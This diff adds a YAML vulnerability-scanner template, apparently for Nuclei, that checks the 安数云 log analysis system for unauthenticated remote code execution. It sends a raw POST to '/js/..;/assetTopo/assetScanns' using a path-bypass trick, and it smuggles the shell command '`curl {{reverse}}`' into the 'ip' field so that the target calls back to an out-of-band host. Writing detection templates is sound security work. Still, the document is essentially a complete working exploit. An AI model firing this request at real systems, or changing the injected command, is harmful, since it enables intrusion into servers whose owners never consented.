@@ -1,0 +1,33 @@
+id: poc-yaml-datacloudsec-clas-assetscanns-rce
+info:
+  name: 安数云综合日志分析系统 assetScanns 远程代码执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: DNSLOG,rce
+
+variables:
+  reverse: '{{interactsh-url}}'
+
+http:
+  - raw:
+      - |
+        POST /js/..;/assetTopo/assetScanns HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        ip=127.0.0.1`curl {{reverse}}`&port=8083
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"message":'
+          - '"status":'
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
